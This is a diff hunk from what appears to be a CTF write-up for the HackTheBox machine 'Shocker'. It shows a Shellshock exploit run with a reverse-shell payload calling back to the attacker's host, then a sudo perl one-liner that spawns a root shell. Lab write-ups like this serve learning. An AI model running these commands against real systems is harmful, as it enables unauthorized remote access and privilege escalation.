@@ -12,3 +12,22 @@ found user.sh in the cgi-bin directory , checked searchsploit to find a python s
 
 python2 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.7 lport=32327 pages=/cgi-bin/user.sh
 
+
+
+
+
+checkiing sudo -l , I'm able to run the perl language as root , immediately checking GTFO bin's , we have a sudo privesc 
+
+
+    sudo perl -e 'exec "/bin/sh";'
+
+so running " sudo -u root perl -e 'exec "/bin/sh";' "   We got root in less than 1 minutes 
+
+
+![image](https://user-images.githubusercontent.com/12541755/113401483-07676d80-9369-11eb-99ac-80aaded21a20.png)
+
+Shocker Pwned 
+### Yipee 
+
+Time to User : 9 Hours
+Time to Root : 1 Minutes 
